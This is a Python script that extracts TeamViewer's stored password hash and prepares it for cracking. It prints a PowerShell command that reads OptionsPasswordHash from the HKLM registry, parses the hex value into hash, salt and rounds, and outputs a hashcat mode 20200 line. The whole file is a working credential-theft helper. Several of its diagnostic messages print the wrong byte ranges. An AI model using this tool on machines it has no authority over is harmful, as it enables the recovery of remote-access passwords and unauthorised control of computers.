from base64 import b64encode

# Base64 "helpers" stolen from `passlib/utils/__init__.py`

# common charmaps
HASH64_CHARS = "./0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz"

_A64_ALTCHARS = b"./"
_A64_STRIP = b"=\n"

def ab64_encode(data):
    """encode using variant of base64
    the output of this function is identical to stdlib's b64_encode,
    except that it uses ``.`` instead of ``+``,
    and omits trailing padding ``=`` and whitepsace.
    it is primarily used by Passlib's custom pbkdf2 hashes.
    """
    return b64encode(data, _A64_ALTCHARS).strip(_A64_STRIP)


def convert_hashes_to_hashcat(h, s):
    h = ab64_encode(h)
    s = ab64_encode(s)
    rounds = "10000"
    # https://hashcat.net/wiki/doku.php?id=example_hashes
    # $pbkdf2-sha512$25000$LyWE0HrP2RsjZCxlDGFMKQ$1vC5Ohk2mCS9b6akqsEfgeb4l74SF8XjH.SljXf3dMLHdlY1GK9ojcCKts6/asR4aPqBmk74nCDddU3tvSCJvw
    return f"$pbkdf2-sha512${rounds}${s.decode()}${h.decode()} "


def main():
    print("Powershell command to get OptionsPasswordHash: (Get-ItemProperty -Path Registry::HKEY_LOCAL_MACHINE\SOFTWARE\TeamViewer\ | Select-Object -ExpandProperty OptionsPasswordHash |  ForEach-Object { '{0:x2}' -f $_ }) -join ''")
    reg = input("Enter hex representation of OptionsPasswordHash: ")

    # First part of value should equal "01030140000000" (where 0x40 there is meaning the length of the hash)
    if reg[0:14] != "01030140000000":
        print(f"First bytes of value did not equal 01030140000000 (value: {reg[0:14]})")
        print("Attempting to continue, but this may indicate an incompatible hash type")

    h = bytes.fromhex(reg[14:142])
    print("Hash:", h.hex())

    # Next part of value should equal "0210000000" (where 0x10 there is meaning length of the salt)
    if reg[142:152] != "0210000000":
        print(f"Prefix of salt bytes did not equal 0210000000 (value: {reg[79:84]})")
        print("Attempting to continue, but this may indicate an incompatible hash type")

    s = bytes.fromhex(reg[152:184])
    print("Salt:", s.hex())

    # Last part of value should equal "030400000010270000" (where 0x10 0x27 is meaning the number of rounds, 10,000)
    if reg[184:202] != "030400000010270000":
        print(f"Suffix/rounds count did not equal 030400000010270000 (value: {reg[84:102]}")
        print("Attempting to continue, but this may indicate an incompatible hash type")
        print("If this is the only error, it may be a case of just changing the number of rounds in the final hash to match the value indicated here (read the comments of this code to find out more!)")

    print("Feed to hashcat (type 20200) ->", convert_hashes_to_hashcat(h, s))


if __name__ == "__main__":
    main()
